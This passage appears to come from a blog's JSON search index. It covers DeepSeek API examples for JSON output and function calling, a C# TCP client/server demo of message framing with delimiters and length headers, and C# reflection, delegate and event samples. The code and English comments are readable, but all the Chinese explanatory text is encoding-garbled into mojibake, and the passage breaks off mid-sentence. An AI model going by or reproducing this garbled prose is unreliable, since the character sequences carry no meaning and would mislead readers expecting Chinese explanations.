ï¼šæœåŠ¡å™¨å†…éƒ¨æ•…éšœè§£å†³æ–¹æ³•ï¼šè¯·ç­‰å¾…åé‡è¯•ã€‚è‹¥é—®é¢˜ä¸€ç›´å­˜åœ¨ï¼Œè¯·è”ç³»æˆ‘ä»¬è§£å†³503 - æœåŠ¡å™¨ç¹å¿™ åŸå› ï¼šæœåŠ¡å™¨è´Ÿè½½è¿‡é«˜è§£å†³æ–¹æ³•ï¼šè¯·ç¨åé‡è¯•æ‚¨çš„è¯·æ±‚ JSON Outputåœ¨å¾ˆå¤šåœºæ™¯ä¸‹ï¼Œç”¨æˆ·éœ€è¦è®©æ¨¡å‹ä¸¥æ ¼æŒ‰ç…§ JSON æ ¼å¼æ¥è¾“å‡ºï¼Œä»¥å®ç°è¾“å‡ºçš„ç»“æ„åŒ–ï¼Œä¾¿äºåç»­é€»è¾‘è¿›è¡Œè§£æã€‚ DeepSeek æä¾›äº† JSON Output åŠŸèƒ½ï¼Œæ¥ç¡®ä¿æ¨¡å‹è¾“å‡ºåˆæ³•çš„ JSON å­—ç¬¦ä¸²ã€‚ æ³¨æ„äº‹é¡¹è®¾ç½® response_format å‚æ•°ä¸º {â€˜typeâ€™: â€˜json_objectâ€™}ã€‚ç”¨æˆ·ä¼ å…¥çš„ system æˆ– user prompt ä¸­å¿…é¡»å«æœ‰ json å­—æ ·ï¼Œå¹¶ç»™å‡ºå¸Œæœ›æ¨¡å‹è¾“å‡ºçš„ JSON æ ¼å¼çš„æ ·ä¾‹ï¼Œä»¥æŒ‡å¯¼æ¨¡å‹æ¥è¾“å‡ºåˆæ³• JSONã€‚éœ€è¦åˆç†è®¾ç½® max_tokens å‚æ•°ï¼Œé˜²æ­¢ JSON å­—ç¬¦ä¸²è¢«ä¸­é€”æˆªæ–­ã€‚ 1234567891011121314151617181920212223242526272829303132333435import jsonfrom openai import OpenAIclient = OpenAI( api_key=&quot;&lt;your api key&gt;&quot;, base_url=&quot;https://api.deepseek.com&quot;,)system_prompt = &quot;&quot;&quot;The user will provide some exam text. Please parse the &quot;question&quot; and &quot;answer&quot; and output them in JSON format. EXAMPLE INPUT: Which is the highest mountain in the world? Mount Everest.EXAMPLE JSON OUTPUT:&#123; &quot;question&quot;: &quot;Which is the highest mountain in the world?&quot;, &quot;answer&quot;: &quot;Mount Everest&quot;&#125;&quot;&quot;&quot;user_prompt = &quot;Which is the longest river in the world? The Nile River.&quot;messages = [&#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: system_prompt&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: user_prompt&#125;]response = client.chat.completions.create( model=&quot;deepseek-chat&quot;, messages=messages, response_format=&#123; &#x27;type&#x27;: &#x27;json_object&#x27; &#125;)print(json.loads(response.choices[0].message.content)) æ¨¡å‹å°†ä¼šè¾“å‡ºï¼š 1234&#123; &quot;question&quot;: &quot;Which is the longest river in the world?&quot;, &quot;answer&quot;: &quot;The Nile River&quot;&#125; Function CallingFunction Calling è®©æ¨¡å‹èƒ½å¤Ÿè°ƒç”¨å¤–éƒ¨å·¥å…·ï¼Œæ¥å¢å¼ºè‡ªèº«èƒ½åŠ›ã€‚ è·å–ç”¨æˆ·å½“å‰ä½ç½®çš„å¤©æ°”ä¿¡æ¯ä¸ºä¾‹ï¼Œå±•ç¤ºäº†ä½¿ç”¨ Function Calling çš„å®Œæ•´ Python ä»£ç ã€‚ Function Calling çš„å…·ä½“ API æ ¼å¼è¯·å‚è€ƒå¯¹è¯è¡¥å…¨æ–‡æ¡£ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445from openai import OpenAIdef send_messages(messages): response = client.chat.completions.create( model=&quot;deepseek-chat&quot;, messages=messages, tools=tools ) return response.choices[0].messageclient = OpenAI( api_key=&quot;&lt;your api key&gt;&quot;, base_url=&quot;https://api.deepseek.com&quot;,)tools = [ &#123; &quot;type&quot;: &quot;function&quot;, &quot;function&quot;: &#123; &quot;name&quot;: &quot;get_weather&quot;, &quot;description&quot;: &quot;Get weather of an location, the user shoud supply a location first&quot;, &quot;parameters&quot;: &#123; &quot;type&quot;: &quot;object&quot;, &quot;properties&quot;: &#123; &quot;location&quot;: &#123; &quot;type&quot;: &quot;string&quot;, &quot;description&quot;: &quot;The city and state, e.g. San Francisco, CA&quot;, &#125; &#125;, &quot;required&quot;: [&quot;location&quot;] &#125;, &#125; &#125;,]messages = [&#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;How&#x27;s the weather in Hangzhou?&quot;&#125;]message = send_messages(messages)print(f&quot;User&gt;\\t &#123;messages[0][&#x27;content&#x27;]&#125;&quot;)tool = message.tool_calls[0]messages.append(message)messages.append(&#123;&quot;role&quot;: &quot;tool&quot;, &quot;tool_call_id&quot;: tool.id, &quot;content&quot;: &quot;24â„ƒ&quot;&#125;)message = send_messages(messages)print(f&quot;Model&gt;\\t &#123;message.content&#125;&quot;) è¿™ä¸ªä¾‹å­çš„æ‰§è¡Œæµç¨‹å¦‚ä¸‹ï¼š ç”¨æˆ·ï¼šè¯¢é—®ç°åœ¨çš„å¤©æ°”æ¨¡å‹ï¼šè¿”å› function get_weather({location: â€˜Hangzhouâ€™})ç”¨æˆ·ï¼šè°ƒç”¨ function get_weather({location: â€˜Hangzhouâ€™})ï¼Œå¹¶ä¼ ç»™æ¨¡å‹ã€‚æ¨¡å‹ï¼šè¿”å›è‡ªç„¶è¯­è¨€ï¼Œâ€The current temperature in Hangzhou is 24Â°C.â€æ³¨ï¼šä¸Šè¿°ä»£ç ä¸­ get_weather å‡½æ•°åŠŸèƒ½éœ€ç”±ç”¨æˆ·æä¾›ï¼Œæ¨¡å‹æœ¬èº«ä¸æ‰§è¡Œå…·ä½“å‡½æ•°ã€‚ æ­¤å¤–è¿˜æœ‰ä¸Šä¸‹æ–‡ï¼Œç¼“å­˜ç­‰ èƒ½åšä»€ä¹ˆï¼Ÿæç¤ºåº“æ¢ç´¢ DeepSeek æç¤ºè¯æ ·ä¾‹ï¼ŒæŒ–æ˜æ›´å¤šå¯èƒ½ ä»£ç æ”¹å†™å¯¹ä»£ç è¿›è¡Œä¿®æ”¹ï¼Œæ¥å®ç°çº é”™ã€æ³¨é‡Šã€è°ƒä¼˜ç­‰ã€‚ ä»£ç è§£é‡Šå¯¹ä»£ç è¿›è¡Œè§£é‡Šï¼Œæ¥å¸®åŠ©ç†è§£ä»£ç å†…å®¹ã€‚ ä»£ç ç”Ÿæˆè®©æ¨¡å‹ç”Ÿæˆä¸€æ®µå®Œæˆç‰¹å®šåŠŸèƒ½çš„ä»£ç ã€‚ å†…å®¹åˆ†ç±»å¯¹æ–‡æœ¬å†…å®¹è¿›è¡Œåˆ†æï¼Œå¹¶å¯¹é½è¿›è¡Œè‡ªåŠ¨å½’ç±» ç»“æ„åŒ–è¾“å‡ºå°†å†…å®¹è½¬åŒ–ä¸º Jsonï¼Œæ¥æ–¹ä¾¿åç»­ç¨‹åºå¤„ç† è§’è‰²æ‰®æ¼”ï¼ˆè‡ªå®šä¹‰äººè®¾ï¼‰è‡ªå®šä¹‰äººè®¾ï¼Œæ¥ä¸ç”¨æˆ·è¿›è¡Œè§’è‰²æ‰®æ¼”ã€‚ è§’è‰²æ‰®æ¼”ï¼ˆæƒ…æ™¯ç»­å†™ï¼‰æä¾›ä¸€ä¸ªåœºæ™¯ï¼Œè®©æ¨¡å‹æ¨¡æ‹Ÿè¯¥åœºæ™¯ä¸‹çš„ä»»åŠ¡å¯¹è¯ æ•£æ–‡å†™ä½œè®©æ¨¡å‹æ ¹æ®æç¤ºè¯åˆ›ä½œæ•£æ–‡ è¯—æ­Œåˆ›ä½œè®©æ¨¡å‹æ ¹æ®æç¤ºè¯ï¼Œåˆ›ä½œè¯—æ­Œ æ–‡æ¡ˆå¤§çº²ç”Ÿæˆæ ¹æ®ç”¨æˆ·æä¾›çš„ä¸»é¢˜ï¼Œæ¥ç”Ÿæˆæ–‡æ¡ˆå¤§çº² å®£ä¼ æ ‡è¯­ç”Ÿæˆè®©æ¨¡å‹ç”Ÿæˆè´´åˆå•†å“ä¿¡æ¯çš„å®£ä¼ æ ‡è¯­ã€‚ æ¨¡å‹æç¤ºè¯ç”Ÿæˆæ ¹æ®ç”¨æˆ·éœ€æ±‚ï¼Œå¸®åŠ©ç”Ÿæˆé«˜è´¨é‡æç¤ºè¯ ä¸­è‹±ç¿»è¯‘ä¸“å®¶ä¸­è‹±æ–‡äº’è¯‘ï¼Œå¯¹ç”¨æˆ·è¾“å…¥å†…å®¹è¿›è¡Œç¿»è¯‘ è¿˜æœ‰ ï¼Œåšå›¾è¡¨ï¼Œç¿»è¯‘åŠ©æ‰‹ï¼Œè½¯ä»¶å·¥ç¨‹å¸ˆï¼Œå¤¸å¤¸æœºï¼Œèµ·åå…ˆç”Ÿï¼Œå‘½ç†å¤§å¸ˆï¼Œå­¦è‹±è¯­ï¼ŒMidjourney Promptï¼ŒDBAï¼Œæ ¼è¨€è­¦å¥ï¼Œæ–‡å­—æ’ç‰ˆï¼Œå°çº¢ä¹¦æ–‡æ¡ˆæ ‡é¢˜ï¼Œçˆ†æ¬¾æ–‡æ¡ˆï¼Œé¢è¯•æ¨¡æ‹Ÿï¼ŒSloganç”Ÿæˆï¼Œé•¿æ–‡æ€»ç»“ï¼Œç§äººå¥èº«æ•™ç»ƒï¼Œè®ºæ–‡æ¶¦è‰²ç­‰ç­‰","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[],"author":"mu"},{"title":"packet splicing","slug":"packet-splicing","date":"2024-11-27T14:46:43.000Z","updated":"2024-11-27T14:51:40.459Z","comments":true,"path":"2024/11/27/packet-splicing/","permalink":"https://banjinmei.github.io/2024/11/27/packet-splicing/","excerpt":"","text":"ï¼š æ¨¡æ‹Ÿç²˜åŒ…çš„åœºæ™¯ç²˜åŒ…é€šå¸¸åœ¨å‘é€ç«¯å› æ•°æ®é¢‘ç¹å†™å…¥ç¼“å†²åŒºå¹¶ä¸€èµ·å‘é€ï¼Œæˆ–è€…åœ¨æ¥æ”¶ç«¯æ²¡æœ‰æ˜ç¡®çš„åˆ†åŒ…é€»è¾‘å¯¼è‡´è¯»å–ä¸å®Œæ•´çš„æ•°æ®åŒ…æ—¶å‘ç”Ÿã€‚ ä½¿ç”¨å›ºå®šåˆ†éš”ç¬¦æˆ–åŒ…å¤´+åŒ…ä½“å¸¸è§çš„è§£å†³ç²˜åŒ…æ–¹æ¡ˆæ˜¯ä½¿ç”¨åˆ†éš”ç¬¦ï¼ˆå¦‚ \\n æˆ–ç‰¹æ®Šå­—ç¬¦ï¼‰ï¼Œæˆ–é‡‡ç”¨å›ºå®šçš„åŒ…å¤´æ ‡è¯†æ•°æ®é•¿åº¦ã€‚ æœåŠ¡ç«¯ä»£ç  1234567891011121314151617181920212223242526272829303132333435363738394041using System;using System.Net;using System.Net.Sockets;using System.Text;using System.Threading;class TcpServer&#123; static void Main() &#123; TcpListener listener = new TcpListener(IPAddress.Any, 5000); listener.Start(); Console.WriteLine(&quot;Server started, waiting for connection...&quot;); Socket clientSocket = listener.AcceptSocket(); Console.WriteLine(&quot;Client connected!&quot;); byte[] buffer = new byte[1024]; int bytesRead; while ((bytesRead = clientSocket.Receive(buffer)) &gt; 0) &#123; string receivedData = Encoding.UTF8.GetString(buffer, 0, bytesRead); Console.WriteLine($&quot;Received: &#123;receivedData&#125;&quot;); // æ¨¡æ‹Ÿæ•°æ®æœªåˆ†åŒ…çš„åœºæ™¯ Console.WriteLine(&quot;Processing received data...&quot;); string[] messages = receivedData.Split(&#x27;|&#x27;); foreach (var message in messages) &#123; if (!string.IsNullOrEmpty(message)) &#123; Console.WriteLine($&quot;Processed: &#123;message&#125;&quot;); &#125; &#125; &#125; clientSocket.Close(); listener.Stop(); &#125;&#125; å®¢æˆ·ç«¯ä»£ç  123456789101112131415161718192021222324252627using System;using System.Net.Sockets;using System.Text;class TcpClientDemo&#123; static void Main() &#123; TcpClient client = new TcpClient(&quot;127.0.0.1&quot;, 5000); Console.WriteLine(&quot;Connected to server.&quot;); NetworkStream stream = client.GetStream(); // æ¨¡æ‹Ÿç²˜åŒ…åœºæ™¯ï¼šè¿ç»­å‘é€å¤šä¸ªå°æ•°æ®åŒ… string[] messages = &#123; &quot;Message1&quot;, &quot;Message2&quot;, &quot;Message3&quot; &#125;; foreach (var message in messages) &#123; string data = message + &quot;|&quot;; byte[] buffer = Encoding.UTF8.GetBytes(data); stream.Write(buffer, 0, buffer.Length); Console.WriteLine($&quot;Sent: &#123;message&#125;&quot;); &#125; stream.Close(); client.Close(); &#125;&#125; åˆ†æä»£ç ä¸­çš„ç²˜åŒ…åœºæ™¯å®¢æˆ·ç«¯æ¨¡æ‹Ÿç²˜åŒ…é€šè¿‡è¿ç»­å‘é€æ•°æ®åŒ…ï¼ˆMessage1|Message2|Message3|ï¼‰ï¼Œæœªç­‰å¾…æœåŠ¡ç«¯å¤„ç†åå†å‘é€ä¸‹ä¸€ä¸ªåŒ…ã€‚ æœåŠ¡ç«¯æ¥æ”¶æ•°æ®æ—¶ï¼Œæ•°æ®å¯èƒ½ä¸€æ¬¡æ€§æ¥æ”¶åˆ°å¤šä¸ªæ•°æ®åŒ…ï¼Œä¹Ÿå¯èƒ½æ¥æ”¶åˆ°ä¸å®Œæ•´çš„æ•°æ®åŒ…ã€‚é€šè¿‡ä½¿ç”¨åˆ†éš”ç¬¦ | æ‹†åˆ†æ•°æ®ï¼Œå¯ä»¥è§£å†³ç²˜åŒ…é—®é¢˜ã€‚ æ‰©å±•ï¼šæ›´é«˜æ•ˆçš„åˆ†åŒ…æ–¹å¼ï¼ˆåŒ…å¤´+åŒ…ä½“ï¼‰æ•°æ®æ ¼å¼åŒ…å¤´ï¼š4 å­—èŠ‚ï¼Œè¡¨ç¤ºåŒ…ä½“é•¿åº¦ã€‚åŒ…ä½“ï¼šå®é™…æ•°æ®å†…å®¹ã€‚ å¤„ç†ç²˜åŒ…é—®é¢˜æœåŠ¡ç«¯ 123456789101112131415161718while (true)&#123; int headerSize = 4; byte[] headerBuffer = new byte[headerSize]; // è¯»å–åŒ…å¤´ int headerBytes = clientSocket.Receive(headerBuffer); if (headerBytes &lt; headerSize) break; // è¿æ¥æ–­å¼€ int bodyLength = BitConverter.ToInt32(headerBuffer, 0); byte[] bodyBuffer = new byte[bodyLength]; // è¯»å–åŒ…ä½“ int bodyBytes = clientSocket.Receive(bodyBuffer); string message = Encoding.UTF8.GetString(bodyBuffer, 0, bodyBytes); Console.WriteLine($&quot;Received Message: &#123;message&#125;&quot;);&#125; å®¢æˆ·ç«¯ä»£ç ï¼ˆåŒ…å¤´ + åŒ…ä½“ï¼‰ 123456789101112131415161718192021222324252627282930313233343536373839using System;using System.Net.Sockets;using System.Text;class TcpClientDemo&#123; static void Main() &#123; TcpClient client = new TcpClient(&quot;127.0.0.1&quot;, 5000); Console.WriteLine(&quot;Connected to server.&quot;); NetworkStream stream = client.GetStream(); // æ¨¡æ‹Ÿå‘é€å¤šæ¡æ¶ˆæ¯ string[] messages = &#123; &quot;Hello, Server!&quot;, &quot;This is a test.&quot;, &quot;Goodbye!&quot; &#125;; foreach (var message in messages) &#123; // å°†æ¶ˆæ¯è½¬ä¸ºå­—èŠ‚æ•°ç»„ byte[] bodyBuffer = Encoding.UTF8.GetBytes(message); // åŒ…å¤´ï¼šæ¶ˆæ¯é•¿åº¦ï¼ˆ4 å­—èŠ‚æ•´æ•°ï¼‰ byte[] headerBuffer = BitConverter.GetBytes(bodyBuffer.Length); // ç»„åˆåŒ…å¤´å’ŒåŒ…ä½“ byte[] packet = new byte[headerBuffer.Length + bodyBuffer.Length]; Buffer.BlockCopy(headerBuffer, 0, packet, 0, headerBuffer.Length); Buffer.BlockCopy(bodyBuffer, 0, packet, headerBuffer.Length, bodyBuffer.Length); // å‘é€æ•°æ®åŒ… stream.Write(packet, 0, packet.Length); Console.WriteLine($&quot;Sent: &#123;message&#125;&quot;); &#125; stream.Close(); client.Close(); Console.WriteLine(&quot;Disconnected from server.&quot;); &#125;&#125; åŒ…å¤´ä½¿ç”¨ BitConverter.GetBytes(int) å°†åŒ…ä½“é•¿åº¦è½¬æ¢ä¸º 4 å­—èŠ‚çš„å­—èŠ‚æ•°ç»„ã€‚è¿™æ ·ï¼ŒæœåŠ¡ç«¯å¯ä»¥æ ¹æ®åŒ…å¤´è§£æå‡ºåŒ…ä½“çš„é•¿åº¦ï¼Œç¡®ä¿ä¸ä¼šæ¼è¯»æˆ–å¤šè¯»æ•°æ®ã€‚ åŒ…ä½“å®é™…çš„æ¶ˆæ¯å†…å®¹ï¼ˆå­—ç¬¦ä¸²ï¼‰è¢«ç¼–ç ä¸ºå­—èŠ‚æ•°ç»„ bodyBufferã€‚ ç»„åˆåŒ…å¤´å’ŒåŒ…ä½“ä½¿ç”¨ Buffer.BlockCopy å°†åŒ…å¤´å’ŒåŒ…ä½“æ‹¼æ¥æˆä¸€ä¸ªå®Œæ•´çš„æ•°æ®åŒ…ï¼ŒæŒ‰ç…§ä»¥ä¸‹æ ¼å¼å‘é€ï¼š [åŒ…å¤´ (4å­—èŠ‚)][åŒ…ä½“ (Nå­—èŠ‚)]å‘é€é€»è¾‘è°ƒç”¨ stream.Write å°†æ•´ä¸ªæ•°æ®åŒ…å‘é€åˆ°æœåŠ¡ç«¯ã€‚å³ä½¿å¤šæ¬¡å‘é€ï¼ŒæœåŠ¡ç«¯ä¾ç„¶èƒ½å¤Ÿæ­£ç¡®è§£ææ¯ä¸ªæ•°æ®åŒ…çš„å†…å®¹ã€‚ è¿è¡Œç»“æœå‡è®¾æœåŠ¡ç«¯æŒ‰ç…§ä¹‹å‰çš„ä»£ç å®ç°åˆ†åŒ…é€»è¾‘ï¼ˆå…ˆè¯»åŒ…å¤´ï¼Œå†æ ¹æ®é•¿åº¦è¯»åŒ…ä½“ï¼‰ï¼Œè¿è¡Œå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯åï¼Œè¾“å‡ºç±»ä¼¼ä»¥ä¸‹ç»“æœï¼š æœåŠ¡ç«¯è¾“å‡º 12345Server started, waiting for connection...Client connected!Received Message: Hello, Server!Received Message: This is a test.Received Message: Goodbye! å®¢æˆ·ç«¯è¾“å‡º 12345Connected to server.Sent: Hello, Server!Sent: This is a test.Sent: Goodbye!Disconnected from server. è¿™ç§æ–¹å¼å¯ä»¥é¿å…ä½¿ç”¨åˆ†éš”ç¬¦ï¼ˆå¦‚ |ï¼‰æ—¶å¯èƒ½äº§ç”Ÿçš„å†²çªé—®é¢˜ï¼Œå¸¸ç”¨äºä¼ è¾“äºŒè¿›åˆ¶æ•°æ®å’Œæ›´å¤æ‚çš„åè®®é€šä¿¡ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[],"author":"mu"},{"title":"csharp reflection delegate","slug":"csharp-reflection-delegate","date":"2024-11-24T09:36:50.000Z","updated":"2024-12-11T13:25:06.302Z","comments":true,"path":"2024/11/24/csharp-reflection-delegate/","permalink":"https://banjinmei.github.io/2024/11/24/csharp-reflection-delegate/","excerpt":"","text":"Reflectionåå°„åŠ¨æ€åŠ è½½å’Œåˆ›å»ºå¯¹è±¡ï¼šåå°„å¯ä»¥åœ¨è¿è¡Œæ—¶åŠ è½½ç¨‹åºé›†ï¼Œå¹¶åŸºäºç±»å‹ä¿¡æ¯åˆ›å»ºå¯¹è±¡å®ä¾‹ï¼Œè€Œæ— éœ€åœ¨ç¼–è¯‘æ—¶çŸ¥é“å…·ä½“çš„ç±»å‹ã€‚è¿™å¯¹äºå®ç°æ’ä»¶ç³»ç»Ÿã€åŠ¨æ€åŠ è½½æ¨¡å—æˆ–åœ¨ä¸åŒç‰ˆæœ¬çš„åº“ä¹‹é—´æä¾›å…¼å®¹æ€§éå¸¸æœ‰ç”¨ã€‚ åå°„å¯ä»¥è·å–æœ‰å…³ç±»å‹ï¼ˆå¦‚ç±»ã€æ¥å£ã€ç»“æ„ä½“ç­‰ï¼‰åŠå…¶æˆå‘˜ï¼ˆå¦‚å­—æ®µã€å±æ€§ã€æ–¹æ³•ç­‰ï¼‰çš„è¯¦ç»†ä¿¡æ¯ã€‚è¿™å¯¹äºç”Ÿæˆæ–‡æ¡£ã€è¿›è¡Œä»£ç åˆ†ææˆ–åˆ›å»ºåºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–æœºåˆ¶ç­‰ä»»åŠ¡éå¸¸æœ‰ç”¨ã€‚ 12345678910111213141516171819202122232425262728class Program &#123; static void Main(string[] args) &#123; // åŠ è½½åŒ…å«ç±»å‹çš„ç¨‹åºé›† Assembly assembly = Assembly.LoadFrom(&quot;ReflectionExample.dll&quot;); // è·å–ç±»å‹ä¿¡æ¯ Type type = assembly.GetType(&quot;ReflectionExample.MyClass&quot;); // åˆ›å»ºå¯¹è±¡å®ä¾‹ object instance = Activator.CreateInstance(type); // è·å–æ–¹æ³•ä¿¡æ¯ MethodInfo methodInfo = type.GetMethod(&quot;MyMethod&quot;); // è°ƒç”¨æ–¹æ³• methodInfo.Invoke(instance, new object[] &#123; &quot;Hello, Reflection!&quot; &#125;); &#125; &#125; public class MyClass &#123; public void MyMethod(string message) &#123; Console.WriteLine(message); &#125; &#125; Delegateå§”æ‰˜å§”æ‰˜æ˜¯ä¸€ç§ç±»å‹å®‰å…¨çš„å‡½æ•°æŒ‡é’ˆï¼Œå¯ä»¥ç”¨æ¥å¼•ç”¨ä¸€ä¸ªæˆ–å¤šä¸ªå…·æœ‰ç›¸åŒç­¾åçš„æ–¹æ³•ã€‚å§”æ‰˜ï¼ˆDelegateï¼‰æ˜¯ä¸€ç§ç‰¹æ®Šçš„ç±»å‹ï¼Œå®ƒä»£è¡¨å¯¹å…·æœ‰ç‰¹å®šå‚æ•°åˆ—è¡¨å’Œè¿”å›ç±»å‹çš„å‡½æ•°çš„å¼•ç”¨ã€‚å§”æ‰˜å¯ä»¥ç”¨æ¥å°è£…é™æ€æ–¹æ³•æˆ–å®ä¾‹æ–¹æ³•ï¼Œå¹¶ä¸”å¯ä»¥åœ¨è¿è¡Œæ—¶åƒæ™®é€šå˜é‡ä¸€æ ·ä¼ é€’ã€‚è¿™ä½¿å¾—å§”æ‰˜æˆä¸ºä¸€ç§å¼ºå¤§çš„å·¥å…·ï¼Œç”¨äºå®ç°å›è°ƒå‡½æ•°ã€äº‹ä»¶å¤„ç†ä»¥åŠå…¶ä»–éœ€è¦å‡½æ•°ä½œä¸ºå‚æ•°ä¼ é€’çš„åœºæ™¯ã€‚ å§”æ‰˜çš„åŸºæœ¬ç‰¹æ€§ç±»å‹å®‰å…¨ï¼šå§”æ‰˜æ˜¯ç±»å‹å®‰å…¨çš„ï¼Œå› ä¸ºå®ƒä»¬åœ¨å£°æ˜æ—¶ä¼šæŒ‡å®šä¸€ä¸ªæ–¹æ³•ç­¾åï¼Œåªæœ‰ä¸è¿™ä¸ªç­¾ååŒ¹é…çš„æ–¹æ³•æ‰èƒ½è¢«å§”æ‰˜å¼•ç”¨ã€‚å¤šæ’­èƒ½åŠ›ï¼šå¤§å¤šæ•°å§”æ‰˜æ”¯æŒå¤šæ’­ï¼Œå³ä¸€ä¸ªå§”æ‰˜å®ä¾‹å¯ä»¥å¼•ç”¨å¤šä¸ªæ–¹æ³•ã€‚å½“è°ƒç”¨è¯¥å§”æ‰˜æ—¶ï¼Œæ‰€æœ‰å¼•ç”¨çš„æ–¹æ³•éƒ½ä¼šè¢«ä¾æ¬¡è°ƒç”¨ã€‚çµæ´»æ€§ï¼šå§”æ‰˜å¯ä»¥ç”¨æ¥å¼•ç”¨ç±»çš„å®ä¾‹æ–¹æ³•æˆ–é™æ€æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥å¼•ç”¨åŒ¿åæ–¹æ³•ï¼ˆä½¿ç”¨lambdaè¡¨è¾¾å¼ï¼‰ã€‚å®šä¹‰å§”æ‰˜å§”æ‰˜å¯ä»¥é€šè¿‡delegateå…³é”®å­—å®šä¹‰ã€‚å®šä¹‰æ—¶éœ€è¦æŒ‡å®šè¿”å›ç±»å‹å’Œå‚æ•°åˆ—è¡¨ã€‚æœ‰è®¿é—®ä¿®é¥°ç¬¦ï¼Œdelegateï¼Œè¿”å›å€¼ç±»å‹ï¼Œå§”æ‰˜åç§°ï¼Œå‚æ•°-å¯é€‰ã€‚å¯ä»¥åœ¨ç±»å†…éƒ¨ï¼Œå¯ä»¥åœ¨å¤–éƒ¨ã€‚ æœ¬è´¨åº•å±‚æ˜¯ä¸ªç‰¹æ®Šç±»(å¼ºç±»å‹)ï¼Œ ç»§æ‰¿è¿è¡Œæ—¶çš„MulticastDelegate 1public delegate void MyDelegate(string message); // è¿”å›ç±»å‹ä¸ºvoidï¼Œæ¥å—ä¸€ä¸ªå­—ç¬¦ä¸²å‚æ•° ä½¿ç”¨å§”æ‰˜åˆ›å»ºå§”æ‰˜å®ä¾‹ å¯ä»¥é€šè¿‡å§”æ‰˜çš„æ„é€ å‡½æ•°æˆ–è€…newå…³é”®å­—åˆ›å»ºå§”æ‰˜å®ä¾‹ï¼Œå¹¶å°†å®ƒç»‘å®šåˆ°å…·ä½“çš„æ–¹æ³•ä¸Šã€‚ 123456789101112131415161718192021222324252627 public class MyClass&#123; public void MyMethod(string message) &#123; Console.WriteLine(message); &#125;&#125;public class Program&#123; public static void StaticMethod(string message) &#123; Console.WriteLine(&quot;Static: &quot; + message); &#125; public static void Main() &#123; MyClass instance = new MyClass(); MyDelegate del1 = new MyDelegate(instance.MyMethod); MyDelegate del2 = new MyDelegate(StaticMethod); // è°ƒç”¨å§”æ‰˜ del1(&quot;Hello from instance method&quot;); del2(&quot;Hello from static method&quot;); &#125;&#125; å¤šæ’­å§”æ‰˜å¦‚æœ å®šä¹‰çš„å§”æ‰˜ä¸æ˜¯voidè¿”å›ç±»å‹ï¼Œé‚£ä¹ˆå½“å§”æ‰˜æŒ‡å‘å¤šä¸ªæ–¹æ³•æ—¶ï¼Œåªæœ‰æœ€åä¸€ä¸ªæ–¹æ³•çš„è¿”å›å€¼ä¼šè¢«è¿”å›ã€‚å¯¹äºè¿”å›ç±»å‹ä¸ºvoidçš„å§”æ‰˜ï¼Œæ‰€æœ‰æ–¹æ³•éƒ½ä¼šè¢«æ‰§è¡Œã€‚ 12345678910111213141516171819202122 public class Program&#123; public static void Method1(string message) &#123; Console.WriteLine(&quot;Method1: &quot; + message); &#125; public static void Method2(string message) &#123; Console.WriteLine(&quot;Method2: &quot; + message); &#125; public static void Main() &#123; MyDelegate del1 = new MyDelegate(Method1); MyDelegate del2 = new MyDelegate(Method2); MyDelegate combined = del1 + del2; // ç»„åˆä¸¤ä¸ªå§”æ‰˜ combined(&quot;Hello multi-cast delegate&quot;); // è°ƒç”¨ç»„åˆåçš„å§”æ‰˜ &#125;&#125; ä½¿ç”¨Lambdaè¡¨è¾¾å¼ä»C# 3.0å¼€å§‹ï¼Œ å¯ä»¥ä½¿ç”¨lambdaè¡¨è¾¾å¼æ¥åˆ›å»ºå§”æ‰˜ï¼Œè¿™ä½¿å¾—ä»£ç æ›´åŠ ç®€æ´ã€‚ 123456789 public class Program&#123; public static void Main() &#123; MyDelegate del = message =&gt; Console.WriteLine(&quot;Lambda: &quot; + message); del(&quot;Hello lambda expression&quot;); &#125;&#125; å‚æ•°ä¼ é€’å§”æ‰˜12345678910111213141516171819202122232425262728293031323334353637383940414243namespace ConsoleApp1T1&#123; public delegate void NoReOutClass(); public class MyDele &#123; public delegate void NoReP(); public delegate void NoRePn(int x, int y); public delegate int WithReP(); public delegate int WithRePn(int x,ref int y); public void show() &#123; //NoReP mh1 = new NoReP(DoNothing); NoReP methodhander1 = DoNothing;//è¯­æ³•ç³– //methodhander1.Invoke();//æ‰§è¡Œå§”æ‰˜ //old dotnet ver BeginInvoke //æœ¬è´¨æ˜¯ç±»çš„å®ä¾‹ å¯ä»¥åšä¸ºå‚æ•°ä¼ é€’ ExDele(methodhander1);//ç±»ä¼¼å®¹å™¨ æŠŠä¸€æ®µå‡½æ•°-ä¸šåŠ¡é€»è¾‘ ä¼ é€’åˆ°ä¸åŒçš„åœ°æ–¹ ////ä½¿ç”¨ // MyDele myDele = new MyDele(); // myDele.show(); &#125; public void ExDele(NoReP de) &#123; de.Invoke(); &#125; public void DoNothing() &#123; Console.WriteLine(&quot;do nothing&quot;); &#125; public void DoObj() &#123; Console.WriteLine(&quot;do obj&quot;); &#125; &#125;&#125; äº‹ä»¶äº‹ä»¶æ˜¯åŸºäºè®¢é˜…-å‘å¸ƒæ¨¡å¼çš„ä¸€ç§æœºåˆ¶ï¼Œç”¨äºå®ç°å¯¹è±¡ä¹‹é—´çš„è§£è€¦ã€‚ 1234567891011121314151617181920212223242526272829303132333435public class Publisher&#123; public event EventHandler CustomEvent; protected virtual void OnCustomEvent(EventArgs e) &#123; CustomEvent?.Invoke(this, e); &#125; public void TriggerEvent() &#123; OnCustomEvent(EventArgs.Empty); &#125;&#125;public class Subscriber&#123; public void OnCustomEvent(object sender, EventArgs e) &#123; Console.WriteLine(&quot;Event received.&quot;); &#125;&#125;public class Program&#123; public static void Main() &#123; Publisher publisher = new Publisher(); Subscriber subscriber = new Subscriber(); publisher.CustomEvent += subscriber.OnCustomEvent; publisher.TriggerEvent(); &#125;&#125; åœ¨ .NET 